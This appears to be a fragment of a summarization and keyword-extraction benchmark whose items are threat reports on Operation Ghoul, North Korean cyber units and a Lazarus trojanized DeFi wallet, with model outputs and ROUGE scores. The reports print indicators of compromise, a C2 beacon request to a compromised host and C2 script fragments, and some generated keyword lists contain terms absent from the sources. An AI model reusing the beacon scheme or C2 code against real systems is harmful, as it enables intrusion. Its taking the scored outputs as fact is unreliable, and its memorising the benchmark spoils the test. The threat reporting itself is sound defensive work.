and other technical details of its operation. In summary, the document analyzes a newly observed malware implant used in recent cyberespionage activities by the Turla/Venomous Bear threat group against European government entities. It highlights the stealth, configurability, and technical capabilities of the malware. <END-1>", "t5/keyword/hint_hit_precision": 0.16216216216216217, "t5/word/hint_hit_recall": 0.05952380952380952, "gpt3/lexical/rouge_rouge1": 0.5544554455445544, "gpt3/lexical/rouge_rouge2": 0.23255813953488372, "gpt3/lexical/rouge_rougeL": 0.33663366336633666, "gpt3/lexical/rouge_rougeLsum": 0.33663366336633666, "gpt3_generated_text": ["The article discusses a recent attack in June 2020 by the Russian Advanced Persistent Threat (APT) group known as Venomous Bear (Turla or Uroburos). The attack involved a previously unseen implant called \"NewPass\" targeting a European Union country in the sector of diplomacy and foreign affairs. The malware is complex, with components including a dropper, loader, and agent for communication with the attackers' command and control server. The dropper deploys the backdoor and configuration file to specific folders to avoid detection, with paths resembling legitimate programs like Adobe Reader or Windows Mixed Reality. The configuration file is encrypted and decoded by the library, with the malware checking for its presence before executing. The article provides detailed analysis of the malware's behavior and components, highlighting the sophistication and stealthiness of the attack."]}, {"split_name": "val", "sample_id": "val_120", "prompt_text": "Extract the keywords: 2016/8/17Operation Ghoul: targeted attacks on industrial and engineering organizations - SecurelistOperation Ghoul: targeted attacks on industrial and engineering organizationsBy Mohamad Amin Hasbini on August 17, 2016. 8:56 amRESEARCHMALWARE PHISHING SOCIAL ENGINEERING SPYWAREMohamad Amin Hasbini Senior Security Researcher@MaHasbiniIntroductionKaspersky Lab has observed new waves of attacks that started on the 8th and the 27th of June 2016. These have been highly active in the Middle East region and unveiled ongoing targeted attacks in multiple regions. The attackers try to lure targets through spear phishing emails that include compressed executables. The malware collects all data such as passwords, keystrokes and screenshots, then sends it to the attackers.Tweet#OpGhoul targeting organizations in 30+ countriesWe found that the group behind this campaign targeted mainly industrial, engineering and manufacturing organizations in moreurl Ghoul: targeted attacks on industrial and engineering organizations - Securelistthan 30 countries. In total, over 130 organizations have been identified as victims of this campaign. Using the Kaspersky Security Network (KSN) and artifacts from malware files and attack sites, we were able to trace the attacks back to March 2015. Noteworthy is that since the beginning of their activities, the attackers\u2019 motivations are apparently financial, whether through the victims\u2019 banking accounts or through selling their intellectual property to interested parties, most infiltrated victim organizations are considered SMBs (Small to Medium size businesses, 30 300 employees), the utilization of commercial off the shelf malware makes the attribution of the attacks more difficult.TweetIn total, over 130 organizations have been identified as victims of Operation Ghoul #OpGhoulIn ancient Folklore, the Ghoul is an evil spirit associated with consuming human flesh and hunting kids, originally a Mesopotamian demon. Today, the term is sometimes used to describe a greedy or materialistic individual.Main infection vector: malicious emailsThe following picture represents emails that are being used to deliver malware to the victims, in what looks like a payment document. The e mails sent by attackers appear to be coming from a bank in the UAE, the Emirates NBD, and include a 7z file with malware. In other cases, victims received phishing links. A quick analysis of the email headers reveals fake sources being utilised to deliver the emails to victims.url Ghoul: targeted attacks on industrial and engineering organizations - SecurelistMalicious attachmentsIn the case of spear phishing emails with an attachment, the 7z does not contain payment instructions but a malware executable (EmiratesNBD_ADVICE.exe). We have observed executables and executives of targeted organizations, most likely because the attackers hope to get access to core intelligence, controlling accounts and other interesting information from people who have the following positions or similar:Chief Executive Officer Chief Operations Officer General Manager General Manager, Sales and Marketing Deputy General Manager Finance and Admin Managerurl Ghoul: targeted attacks on industrial and engineering organizations - SecurelistBusiness Development Manager Head of Logistics EngineerTechnical detailsMalware functionalityThe malware is based on the Hawkeye commercial spyware, which provides a variety of tools for the attackers, in addition to malware anonymity from attribution. It initiates by self deploying and configuring persistence, while using anti debugging and timeout techniques, then starts collecting interesting data from the victim\u2019s device, including:Keystrokes Clipboard data FileZilla ftp server credentials Account data from local browsers Account data from local messaging clients (Paltalk, Google talk, AIM\u2026) Account data from local email clients (Outlook, Windows Live mail\u2026) License information of some installed applicationsTweet#OpGhoul malware collects all data such info@ozlercelikkapi[.]com eminfo@eminenture[.]comBoth ozlercelikkapi[.]com and eminenture[.]com seem to belong to compromised organisations operating in manufacturing and information from the victim\u2019s PC. This information includes compromised device running multiple malware campaigns.Victim informationVictim organizations are distributed in different countries worldwide with attackers focused on certain countries more than others:url Ghoul: targeted attacks on industrial and engineering organizations - SecurelistNumber of Victim Organisations by CountryCountries marked as \u201cothers\u201d have less than three victim organizations each, they are: Switzerland, Gibraltar, USA, Sweden, China, France, Azerbaijan, Iraq, Turkey, Romania, Iran, Iraq and Italy.Victim industry informationVictim industry types were also indicators of targeted attacks as attackers were looking to infiltrate organizations that belong to the product life cycle of multiple goods, especially industrial #travel targets of #OpGhoulTweeturl Ghoul: targeted attacks on industrial and engineering organizations - SecurelistNumber of Victim Organizations by Industry TypeVictim industry descriptionIndustrialEngineeringShippingPharmaceuticalManufacturingTradingEducationTourismTechnology/ITUnknownPetrochemical, naval, military, aerospace, heavy machinery, solar energy, steel, pumps, International freight shipping Production/research of pharmaceutical and beauty products Furniture, decor, textiles Industrial, electronics and food trading Training centers, universities, Providers of IT technologies and consulting services Unidentified victimsThe last attack wavesKaspersky Lab user statistics indicate the new waves of attacks that started in June 2016 are focused on certain countries moreurl others.Operation Ghoul: targeted attacks on industrial and engineering organizations - Securelist#opghoul highly active in #MiddleEastTweetHundreds of detections have been reported by Kaspersky Lab users\u037e 70% of the attacked users were found in the United Arab Emirates alone, the other 30% were distributed in Russia, Malaysia, India, Jordan, Lebanon, Turkey, Algeria, Germany, Iran, and although they are taken down quickly, more than 150 user accounts were identified as victims of the phishing links sent by the attackers. Victims were connecting from the following devices and inserting their credentials, a reminder that phishing attacks do work on all platforms:Windows Mac OS X Androidurl Ghoul: targeted attacks on industrial and engineering organizations - SecurelistThe malware files are detected using the following heuristic signatures:Trojan.MSIL.ShopBot.ww Trojan.Win32.Fsysna.dfah Trojan.Win32.GenericConclusionOperation Ghoul is one of the many attacks in the wild targeting industrial, manufacturing and engineering organizations, Kaspersky Lab recommends users to be extra cautious while checking and opening emails and attachments. In addition, privileged users need to be well trained and ready to deal with cyber threats\u037e failure in this is, in most cases, the cause behind private or corporate data leakage, reputation and financial loss.Indicators of CompromiseThe following are common among the different malware infections\u037e the presence of these is an indication of a possible infection.Filenames and paths related to malwareC:\\Users\\%UserName%\\AppData\\Local\\Microsoft\\Windows\\bthse rv.exe C:\\Users\\%UserName%\\AppData\\Local\\Microsoft\\Windows\\BsBh vScan.exe C:\\Users\\%UserName%\\AppData\\Local\\Client\\WinHttpAutoProxy Sync.exe C:\\Users\\%UserName%\\AppData\\Local\\Client\\WdiServiceHost.ex e C:\\Users\\%UserName%\\AppData\\Local\\Temp\\AF7B1841C6A70C 858E3201422E2D0BEA.dat C:\\Users\\%UserName%\\AppData\\Roaming\\Helper\\Browser.txt C:\\Users\\%UserName%\\AppData\\Roaming\\Helper\\Mail.txt C:\\Users\\%UserName%\\AppData\\Roaming\\Helper\\Mess.txt C:\\Users\\%UserName%\\AppData\\Roaming\\Helper\\OS.txt C:\\ProgramData\\Mails.txt apple recovery[.]us security block[.]com com wn[.]in Mercadojs[.]comObserved phishing URLshxxp://free.meedlifespeed[.]com/ComCast/ hxxp://emailreferentie.appleid.apple.nl.468213579[.]com/ hxxp://468213579[.]com/emailreferentie.appleid.apple.nl/emailveriurl Ghoul: targeted attacks on industrial and engineering organizations - Securelistficatie 40985443/home/login.php hxxp://verificatie.appleid.apple.nl.referentie.357912468[.]com/em ailverificatie 40985443/home/lo\u2026 hxxp://customer.comcast.com.aboranian[.]com/login hxxp://apple recovery[.]us/ hxxp://apple.security block[.]com/Apple%20  %20My%20Apple%20ID.html hxxp://cgi.ebay.com wn[.]in/itm/2000 Jeep Wrangler Sport 4\u00d74 /? ViewItem&item=17475607809 hxxp://https.portal.apple.com.idmswebauth.login.html.appidkey.05 bfd052461b0b3ab1bc2b445a[.]com/login.html and April 2016:hxxp://glazeautocaree[.]com/proforma invoice.exe hxxp://brokelimiteds[.]in/cdn/images/bro.exe hxxp://brokelimiteds[.]in/cdn/images/onowu.exe hxxp://brokelimiteds[.]in/cdn/images/obe.exe hxxp://brokelimiteds[.]in/wp admin/css/upload/order.exe hxxp://brokelimiteds[.]in/wp admin/css/upload/orders.exe hxxp://papercuts[.]info/SocialMedia/java.exe hxxp://studiousb[.]com/mercadolivrestudio/f.zip hxxp://copylines[.]biz/lasagna/gate.php?request=trueFor more information on how you can protect your business from similar attacks, please visit this post from Kaspersky Business.Related PostsPROJECTSAURON: THE RISE OF MISSING PIECEurl ", "generated_text": "Operation Ghoul; over 130 organizations; March 2015; the attackers; spear; phishing emails; attachments; victims; encrypted data; keystrokes; screenshots; the malware; use; Hawkeye; persistence; control; date; the malware; the victims; files; indicators; compromise; the attacks; infrastructure.", "ref_text": "<START-1>The report analyzes an ongoing targeted cyberespionage campaign called Operation Ghoul that has been active since at least March 2015. The attackers send spearphishing emails containing malware that collects sensitive data from victims. Over 130 organizations have been identified as targets, mostly industrial, engineering, and manufacturing companies in the Middle East and Asia. The malware is based on the Hawkeye commercial spyware and exfiltrates data like keystrokes, screenshots, credentials, etc. back to the attackers. Technical analysis is provided on the malware functionality, command and control infrastructure, victimology, and indicators of compromise. The attacks are focused on stealing sensitive data from companies involved in making industrial equipment and hardware, likely for financial gain. The report concludes with recommendations for protection against similar targeted attacks. <END-1>", "t5/keyword/hint_hit_precision": 0.7083333333333334, "t5/word/hint_hit_recall": 0.2032520325203252, "gpt3/lexical/rouge_rouge1": 0.5365853658536586, "gpt3/lexical/rouge_rouge2": 0.1721311475409836, "gpt3/lexical/rouge_rougeL": 0.3333333333333333, "gpt3/lexical/rouge_rougeLsum": 0.3333333333333333, "gpt3_generated_text": ["Operation Ghoul is a targeted cyber attack campaign that has been active since March 2015, with over 130 organizations identified as victims. The attackers use spear phishing emails with malicious attachments to infiltrate industrial and engineering organizations in more than 30 countries. The malware used in these attacks, based on the Hawkeye spyware, collects sensitive data such as keystrokes and screenshots from the victims' devices. The attackers' motivations appear to be financial, targeting SMBs to gain access to banking accounts or intellectual property. The attacks are difficult to attribute due to the use of commercial off-the-shelf malware and fake email sources. The victims' infrastructure and files are compromised, with the attackers focused on specific countries and industries in their infiltration efforts."]}, {"split_name": "val", "sample_id": "val_121", "prompt_text": "Extract the keywords: www.mandiant.com /resources/mapping-dprk-groups-to-government Not So Lazarus: Mapping DPRK Cyber Threat Groups to Government OrganizationsMandiant believes that North Korea's cyber capability supports both long-standing and immediate political and national security priorities, as well as financial goals. We assess most of North Korea's cyber operations, including espionage, destructive operations, and financial crimes, are primarily conducted by elements within the Reconnaissance General Bureau. Meanwhile, the Ministry of State Security and United Front Department\u2019s missions appear to play limited roles in North Korea's cyber program. Open- source reporting often uses the Lazarus Group title as an umbrella term referring to numerous North Korean cyber operators, however, understanding the different institutions within this secretive hermit nation and how they continue to evolve and share resources aids organizations in proactively defending from these types of threats. Mandiant judges North Korea's intelligence apparatus possesses the flexibility and resilience to create cyber units based on the needs of the country. Additionally overlaps in infrastructure, malware, and tactics, techniques and procedures indicate there are shared resources amongst their cyber operations.Figure 1 is an assessed cyber organizational chart derived from various OSINT, targeting patterns, malware usage, and defector reporting that shines some light onto a seeming change taking place within the North Korean cyber ranks.1/5Figure 1: Assessed cyber structure of DPRK cyber programsUnited Front DepartmentUFD is an organization sponsored by the Central Committee of the Workers' Party of Korea. Although it is comprised of operating groups that may not correspond to well-known \u201ccyber actors\u201d, the organization's overall effort centers around disseminating pro-regime propaganda targeting South Korea, likely to undermine their primary geopolitical rival. The UFD typically leverages online information operations, including an \"army of cyber trolls,\" to promote pro-DPRK political narratives on web forums as well as conventional propaganda efforts, such as leaflets and radio broadcasts targeting their southern neighbor.In a two-year span, these \u201ccyber trolls\u201d allegedly hijacked South Korean users accounts online and posted an estimated 68k propaganda items in web forums and various comment sections in an attempt to2/5amplify the regimes\u2019 message in South Korea. This organization\u2019s end goal is the establishment of pro- North Korean groups within South Korea Ministry of State SecurityThe MSS is the DRPK's primary counterintelligence service which operates as an autonomous part of the government and is primarily tasked with domestic counterespionage and overseas counterintelligence activities. APT37's previous campaigns targeting foreign joint venture partners as well as threat activity against defectors, defector support agencies, and humanitarian organizations indicate APT37's activities most likely align with the agenda of MSS.APT37's assessed primary mission is covert intelligence gathering in support of DPRK's strategic military, political, and economic interests. A lack of recent, significant activity from this actor matched with an uptick in similar targeting from units within the \u201cKimsuky\u201d actor-set may indicate a shift or consolidation within North Korea\u2019s cyber leadership.Reconnaissance General Bureau: An OverviewThe RGB is the North Korea's primary foreign intelligence service, responsible for intelligence collection and clandestine operations. It is believed to be comprised of six bureaus:1st Bureau: Operations 2nd Bureau: Reconnaissance 3rd Bureau: Foreign Intelligence 5th Bureau: Inter-Korean Affairs 6th Bureau: Technology 7th Bureau: SupportNotably, a 4th bureau does not exist likely because the number \"4\" is considered taboo.While cyber efforts are a portion of the organization's overall operations, the 3rd Bureau (Foreign Intelligence) and 5th Bureau (Inter-Korean Affairs) appear to hold the \u201cmeat and potatoes\u201d of North Korea's cyber program. Reconnaissance General Bureau: 3rd BureauLab 110\u2026the focal point for the Lazarus Group UmbrellaTEMP.Hermit, APT38, and Andariel are likely subordinate to Lab 110. Lab 110 is likely an expanded and reorganized version of \"Bureau 121,\" often noted as North Korea's primary hacking unit. Lab 110 contains some elements that are most closely aligned with the organization, publicly reported as \"Lazarus Group.\" Open-source reporting often uses the Lazarus Group title as an umbrella term, referring to numerous clusters that we track separately. Although TEMP.Hermit is most frequently aligned with Lazarus Group reporting, often times, researchers and open sources lump all three of these actor sets \u2013 and sometimes even all of the North Korean APTs \u2013 merely as \u201cLazarus Group\u201d.3/5TEMP.Hermit is an actor that has been around since at least 2013. Their operations since that time are representative of Pyongyang's efforts to collect strategic intelligence to benefit North Korean interests. This actor targets government, defense, telecommunications, and financial institutions worldwide and the term \u201cLazarus Group\u201d refers most often to this cluster of activities. APT38 is a financially motivated group sponsored by North Korea, known for significant financial compromises and its use of destructive malware against financial institutions. The group has been attributed to sophisticated compromises targeting Interbank Fund Transfer Systems to steal millions of dollars at a time across multiple countries worldwide. Andariel focuses its operations on foreign businesses, government agencies, financial services infrastructure, private corporations, and businesses, as well as the defense industry. The group also conducts cyber crime likely as an extra source of income to the government as we observed in signature malware activity by this actor; however, targeting of military and government personnel appear to be the primary focus. Bureau 325 was publicly announced in January 2021, when the structure of the RGB likely shifted in response to the coronavirus (COVID-19) pandemic. The new unit appeared to take on primarily conducting intelligence gathering operations against COVID-19 research and manufacturing organizations. Defector reporting also stated that in January 2021, the unit was not fully operational. Overtime, we have observed sharing of efforts and \"non-COVID-19\" type of activities, indicating this actor may be nearing the milestone that defector reporting states, \u201c the group will soon begin \u2018full-scale\u2019 operations\u201d. This newly formed Bureau 325 houses the DPRK COVID-19- focused unit and corresponds to activities tracked in the open source as \u201cCERIUM\u201d. We suspect that individuals from several previously tracked clusters \u2013 including TEMP.Hermit, and Kimsuky \u2013 were also drafted to Bureau 325 to respond to high-priority operations from DPRK leadership. Over time, we began to see this organization shift from \u201cstrictly COVID-19\u201d efforts to the targeting of defectors, defense and governments, bloggers, media, cryptocurrency services, and financial institutions. This increase in responsibilities indicates the group has quickly gained the confidence of DPRK\u2019s senior leadership and likely gained prominence. Defenders will continue to see Bureau 325's fingerprints on more campaigns in the wild.Reconnaissance General Bureau: 5th BureauThere are overlaps that indicate cyber elements of the UFD share interests regarding issues on the Korean peninsula and share targeting overlaps with APT37; however, these extra elements appear to be supplemental to the 5th Bureau\u2019s overall mandate.Kimsuky is an actor often conflated in OSINT that conducts targeted campaigns to collect strategic intelligence on geopolitical events and negotiations affecting the DPRK's interests. The actor primarily targets organizations in the U.S. and South Korea, including individuals working within the government, military, manufacturing, academic, and think tank organizations that possess subject matter expertise in defense and security, particularly nuclear security and nonproliferation policy. This threat actor\u2019s activities include collecting financial, personal, and client data specifically from academic, manufacturing, and national security industries in South Korea. The most likely reason is for the purpose of setting up further infrastructure for cyber espionage operations, leveraging personas for phishing campaigns, or carrying out identity theft and fraud.4/5ConclusionThe country's espionage operations are believed to be reflective of the regime's immediate concerns and priorities, which is likely currently focused on acquiring financial resources through crypto heists, targeting of media, news, and political entities, information on foreign relations and nuclear information, and a slight decline in the once spiked stealing of COVID-19 vaccine research. Information collected in these campaigns will possibly be used to develop or produce internal items and strategies, as in vaccines, mitigations to bypass sanctions, funding for the country\u2019s weapons programs, and so on. Additional information continues to be collected to determine the extent to which these groups operate and streamline their operations. Being able to see though the intentional fog left by North Korean leadership, and able to identify targeting patterns that align to physical units allows for a proactive defense against these cyber operators. This effort is critical in a country where little is known to the outside world and defector reporting supplemented with cyber operations can help.5/5 ", "generated_text": "Mandiant; North Korea; cyber capabilities; political priorities; financial crimes; espionage; top; governments; Reconnaissance General Bureau; the ministry of state security; United Front Department; the group; cloud services; espionage; financial crimes; the Reconnaissance General Bureau; tactics; techniques; procedures; RAT; a shift; TEMP. Hermit; APT38; Andariel; Lab 110; the Lazarus Group Umbrella; the organization; infrastructure; infrastructure; APT37; cyber trolls; South Korean users; September 2014; The report; NATO; the North Korean government; the method; the Lazarus Group; cooperation; the government.", "ref_text": "<START-1>The document provides an overview of North Korea's cyber capabilities, which are used to support political, security, and financial objectives. Mandiant assesses that most cyber operations are conducted by the Reconnaissance General Bureau (RGB). The United Front Department focuses on propaganda and influence operations targeting South Korea. The Ministry of State Security conducts espionage aligned with North Korea's strategic interests. Within the RGB, Lab 110 appears to be the center for North Korea's most advanced cyber activities, including those tracked under TEMP.Hermit, APT38, and Andariel. This is an expanded version of Bureau 121, known as North Korea's primary hacking unit. RGB's 3rd Bureau, foreign intelligence, contains Lab 110. TEMP.Hermit conducts cyber espionage worldwide. APT38 focuses on financially-motivated attacks. Andariel targets foreign businesses and governments. Bureau 325 formed in 2021 to target COVID-19 organizations but has expanded its targeting. The 5th Bureau handles inter-Korean affairs. Kimsuky conducts espionage against South Korean and U.S. targets. There is some overlap between the 3rd and 5th Bureaus. North Korea's cyber structure evolves to meet changing priorities. Understanding the different groups and institutions helps inform defenses against North Korean cyber threats. <END-1>", "t5/keyword/hint_hit_precision": 0.3, "t5/word/hint_hit_recall": 0.12903225806451613, "gpt3/lexical/rouge_rouge1": 0.537467700258398, "gpt3/lexical/rouge_rouge2": 0.2337662337662338, "gpt3/lexical/rouge_rougeL": 0.2790697674418604, "gpt3/lexical/rouge_rougeLsum": 0.2790697674418604, "gpt3_generated_text": ["The article from Mandiant discusses North Korea's cyber capabilities, which support political priorities, financial goals, and national security concerns. The Reconnaissance General Bureau is identified as the primary entity behind most cyber operations, including espionage, destructive operations, and financial crimes. The Ministry of State Security and United Front Department play limited roles in North Korea's cyber program. The article highlights the evolving nature of North Korea's cyber operations, with shared resources and overlaps in infrastructure, malware, and tactics. A cyber organizational chart is provided, showing the structure of DPRK cyber programs. The United Front Department focuses on propaganda targeting South Korea, while the Ministry of State Security engages in covert intelligence gathering. The Reconnaissance General Bureau, specifically the 3rd Bureau, is identified as a key player in North Korea's cyber program, with Lab 110 serving as a focal point for the Lazarus Group umbrella. TEMP.Hermit, APT38, and Andariel are believed to be subordinate to Lab 110. Overall, the article provides insight into the different government organizations involved in North Korea's cyber operations and the need for organizations to proactively defend against these threats."]}, {"split_name": "val", "sample_id": "val_122", "prompt_text": "Extract the keywords: securelist.com /lazarus-trojanized-defi-app/106195/ Lazarus Trojanized DeFi app for delivering malwareAuthorsGReATFor the Lazarus threat actor, financial gain is one of the prime motivations, with a particular emphasis on the cryptocurrency business. As the price of cryptocurrency surges, and the popularity of non-fungible token (NFT) and decentralized finance (DeFi) businesses continues to swell, the Lazarus group\u2019s targeting of the financial industry keeps evolving.We recently discovered a Trojanized DeFi application that was compiled in November 2021. This application contains a legitimate program called DeFi Wallet that saves and manages a cryptocurrency wallet, but also implants a malicious file when executed. This malware is a full-featured backdoor containing sufficient capabilities to control the compromised victim. After looking into the functionalities of this backdoor, we discovered numerous overlaps with other tools used by the Lazarus group.The malware operator exclusively used compromised web servers located in South Korea for this attack. To take over the servers, we worked closely with the KrCERT and, as a result of this effort, we had an opportunity to investigate a Lazarus group C2 server. The threat actor configured this infrastructure with servers set up as multiple stages. The first stage is the source for the backdoor while the goal of the second stage servers is to communicate with the implants. This is a common scheme used in Lazarus infrastructure. BackgroundIn the middle of December 2021, we noticed a suspicious file uploaded to VirusTotal. At first glance, it looked like a legitimate application related to decentralized finance (DeFi); however, looking closer we found it initiating an infection scheme. When executed, the app drops both a malicious file and an installer for a legitimate application, launching the malware with the created Trojanized installer path. Then, the spawned malware overwrites the legitimate application with the Trojanized application. Through this process, the Trojanized application gets removed from the disk, allowing it to cover its tracks.1/8Infection timeline Initial infectionWhile it\u2019s still unclear how the threat actor tricked the victim into executing the Trojanized application social media. The hitherto unknown infection procedure starts with the Trojanized application. This installation package is disguised as a DeFi Wallet program containing a legitimate binary repackaged with the installer.Upon execution, it acquires the next stage malware path (C:\\ProgramData\\Microsoft\\GoogleChrome.exe) and decrypts it with a one-byte XOR (Key: 0x5D). In the process of creating this next malware stage, the installer writes the first eight bytes including the \u2018MZ\u2019 header to the file GoogleChrome.exe and pushes the remaining 71,164 bytes from the data section of the Trojanized application. Next, the malware loads the resource CITRIX_MEETINGS from its body and saves it to the path C:\\ProgramData\\Microsoft\\CM202025.exe. The resulting file is a legitimate DeFi Wallet application. Eventually, it executes the previously created malware with its file name as a parameter:C:\\ProgramData\\Microsoft\\GoogleChrome.exe \u201c[current file name]\u201dMalware creation diagram benign instance of the Google Chrome browser. Upon launch, the malware checks if it was provided with one argument before attempting to copy the legitimate application \u201cC:\\ProgramData\\Microsoft\\CM202025.exe\u201d to the path given as the command line parameter, which means overwriting the original Trojanized installer, almost certainly in an attempt to conceal its prior existence. Next, the malware executes the legitimate file to deceive the victim by showing its benign installation process. When the user executes the newly installed program, it shows the DeFi Wallet software built with the public source code[1].2/8Screenshot of the manipulated applicationNext, the malware starts initializing the configuration information. The configuration shows the structure shown in the table below, consisting of flags, C2 server addresses, victim identification value, and time value. As the structure suggests, this malware can hold up to five C2 addresses, but only three C2 servers are included in this case.Offset 0x16B0Length(bytes) Description 8Flag for starting C2 operation Random value to select C2 server Random value for victim identifier C2 server address C2 server address C2 server address C2 server address C2 server address Buffer for system information Full cmd.exe path Temporary folder path Time to start backdoor operation Time interval Flag for gathering logical drives Flag for enumerating session information The time value for gathering logical drive and session informationThe malware randomly chooses a C2 server address and sends a beacon signal to it. This signal is a hard-coded \u20180x60D49D94\u2019 DWORD without encryption; the response data returned from the C2 carries the same value. If the expected value from the C2 server is received, the malware starts its backdoor operation.Following further communication with the C2, the malware encrypts data by a predefined method. The encryption is done via RC4 and the hard-coded key 0xD5A3 before additionally being encoded with base64.The malware generates POST parameters with hard-coded names. The request type (msgID), victim identification value, and a randomly generated value are merged into the \u2018jsessid\u2019 parameter. It also uses the \u2018cookie\u2019 parameter to store four randomly generated four-byte values. These values are again encrypted with RC4 and additionally base64 encoded. Based on our investigation of the C2 script, we observed this malware not only uses a parameter named \u2018jsessid\u2019, but also \u2018jcookie\u2019 as well.3/8Structure of \u2018jsessid\u2019 parameterThe following HTTP request shows the malware attempting to connect to the C2 with the request type \u201960d49d98\u2032 and a randomly generated cookie value.12345678POST /include/inc.asp HTTP/1.1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)Host: emsystec.comContent-Length: 80Cache-Control: no-cachejsessid=60d49d980163be8f00019f91&cookie=29f23f917ab01aa8lJ3UYA==2517757b7dfb47f1Depending on the response from the C2, the malware performs its instructed backdoor task. It carries various functionalities to gather system information and control the victim machine.Command Set time configuration with the current time interval (default is 10) value Set time configuration with delivered data from C2 server Gather system information, such as IP address, computer name, OS version, CPU architecture Collect drive information including type and free size Enumerate files (with file name, size, time) Change working directory Connect to a given IP address File timestamping Execute Windows command Securely delete a file Spawn process with CreateProcessW API Spawn process with CreateProcessAsUserW API Spawn process with high integrity level Download file from C2 server and save to given file path Send file creation time and contents Add files to .cab file and send it to the C2 server Collect a list of files at the given path Send the configuration to the C2 server Receive new configuration from the C2 server Set config to the current time Sleep 0.1 seconds and continueLazarus only used compromised web servers located in South Korea in this campaign. As a result of working closely with the KrCERT in taking down some of them, we had a chance to look into the corresponding C2 script from one of the compromised servers. The script described in this section was discovered in the following path:4/81 url script is a VBScript.Encode ASP file, commonly used by the Lazarus group in their C2 scripts. After decoding, it shows the string \u201960d49d95\u2032 as an error response code, whereas the string \u201960d49d94\u2032 is used as a success message. In addition, the connection history is saved to the file \u2018stlogo.jpg\u2018 and the C2 address for the next stage is stored in the file \u2018globals.jpg\u2018 located in the same folder.Configuration of C2 scriptThis script checks what value is delivered in the \u2018jcookie\u2019 parameter and, if it\u2019s longer than 24 characters, it extracts the first eight characters as msgID. Depending on the msgID value, it calls different functions. The backdoor command and command execution result delivered by the backdoor get stored to global variables. We have seen this scheme in operation before with the Bookcode[2] cluster. This script uses the following variables as flags and buffers to deliver data and commands between the backdoor and a second stage C2 server:lFlag: flag to signal that there is data to deliver to the backdoor lBuffer: buffer to store data to be later sent to the backdoor tFlag: flag to signal that there is a response from the backdoor tBuffer: buffer to store incoming data from the backdoormsgIDFunction name Description60d49d98TFConnect60d49d99TConnect60d49d9aLConnect60d49d9cCheck60d49d9d the othersLogDown N/AAttributionSave the \u2018TID\u2019 value (victim identifier) to the log file, send \u2018jcookie\u2019 value with the client\u2019s IP address after acquiring the next stage C2 address from the config file (globals.jpg). Forward the response from the next stage server to the client. Deliver the command to the backdoor:If the lFlag is \u2018true\u2019, send lBuffer to the client. Reset \u2018lBuffer\u2019 and set lFlag to \u2018false\u2019. Otherwise, reset \u2018tBuffer\u2019 and set tFlag to \u2018false\u2019. Send the command and return the command execution result:Set \u2018 lBuffer\u2019 value to \u2018jcookie\u2019 parameter, delivering \u2018tBuffer\u2019 to the client. Retrieve host information (computer name, OS version). Delete the configuration file, which saves the C2\u2019s next stage address, if it exists. Then save the new configuration with delivered data through the \u2018jcookie\u2019 parameter. Deliver log file after base64 encoding and then delete it. Write connections with unknown/unexpected msgID (request type) data to a log file, entries are tagged with \u2018xxxxxxxx\u2019.We believe with high confidence that the Lazarus group is linked to this malware as we identified similar malware in the CookieTime cluster. The CookieTime cluster, called LCPDot by JPCERT, was a malware cluster that was heavily used by the Lazarus group until recently. We\u2019ve seen Lazarus group target the defence industry using the CookieTime cluster with a job opportunity decoy. We have already published several reports about this cluster to our Threat Intelligence Service customers, and we identified a Trojanized Citrix application discovered in the latest investigation, and the previously discovered Trojanized application, are almost identical. They share, among other things, the same C2 communication method, backdoor functionalities, random number generation routine and the same method to encrypt communication data. Also, this malware was mentioned in an article by Ahnlab discussing connections with the CookieTime (aka LCPDot) malware.5/8Same backdoor switch of old CookieTime malwareIn turn, we identified that the CookieTime cluster has ties with the Manuscrypt and ThreatNeedle clusters, which are also attributed to the Lazarus group. This doesn\u2019t only apply to the backdoor itself, but also to the C2 scripts, which show several overlaps with the ThreatNeedle cluster. We discovered almost all function and variable names, which means the operators recycled the code base and generated corresponding C2 scripts for the malware.ThreatNeedle C2 script from roit.co[.]kr/xyz/adminer/edit_fail_decoded.asp 1functIon getIpAddress()23456789On ErroR resume nextDim ipip=Request.SErVervariables(\"HTTP_CLIENT_IP\")If ip=\"\"THenIp=ReQUest.ServervaRiAbLes(\"HTTP_X_FORWARDED_FOR\")If ip=\"\"ThEnip=request.ServerVaRiables(\"REMOTE_ADDR\")End IfC2 script of this case123456789fUnctioN GetIpAddress()ON Error Resume NextDim iPip=ReqUest.ServerVaRiables(\"HTTP_CLIENT_IP\")If ip=\"\"THEniP=Request.SErverVariaBleS(\"HTTP_X_FORWARDIf ip=\"\"thenip=reQuest.ServErVariables(\"REMOTE_ADDR\")EnD IF10End if11GEtIpAdDress=ipEnd FuNction12Almost identical scripts to fetch IP address of client10EnD If11GEtipAddreSs=ipEnd FUnction12ThreatNeedle C2 script from: edujikim[.]com/pay_sample/INIstart.asp 1Sub writeDataToFile(strFileName, byData)23456789Dim objFSO, objFile, strFilePathConst ForAppending = 8strFilePath = Server.MapPath(\".\") & \"\\\" &strFileNameSet objFSO =CreateObject(\"Scripting.FileSystemObject\")Set objFile =objFSO.OpenTextFile(strFilePath,10ForAppending, True)11objFile.Write byData12objFile.Close13End SubC2 script of this case123456789Sub WritedatA(filepath,byData)dim objFSO,oBJFileConSt ForAppEnDing=8SetobjFsO=CreateObject(\"Scripting.FileSystemObject\")SeTobjFIle=objFso.OpENTextFile(filepaTh,FoRAppending,True)objFilE.Write ByDatAobjFIle.CLoseEnD Sub106/8Similar scripts to save data to a file ConclusionsIn a previous investigation we discovered that the BlueNoroff group, which is also linked to Lazarus, compromised another DeFi wallet program called MetaMask. As we can see in the latest case, the Lazarus and BlueNoroff groups attempt to deliver their malware without drawing attention to it and have evolved sophisticated methods to lure their victims. The cryptocurrency and blockchain-based industry continues to grow and attract high levels of investment. For this reason, we strongly believe Lazarus\u2019s interest in this industry as a major source of financial gain will not diminish any time soon. Indicators of CompromiseTrojanized DeFi application hxxp://emsystec[.]com/include/inc[.]asp hxxp://www[.]gyro3d[.]com/common/faq[.]asp hxxp://www[.]newbusantour[.]co[.]kr/gallery/left[.]asp hxxp://ilovesvc[.]com/HomePage1/Inquiry/privacy[.]asp hxxp://www[.]syadplus[.]com/search/search_00[.]asp hxxp://bn-cosmo[.]com/customer/board_replay[.]aspSecond stage C2 servers (Legitimate, compromised) hxxp://softapp[.]co[.]kr/sub/cscenter/privacy[.]asp hxxp://gyro3d[.]com/mypage/faq[.]asp MITRE 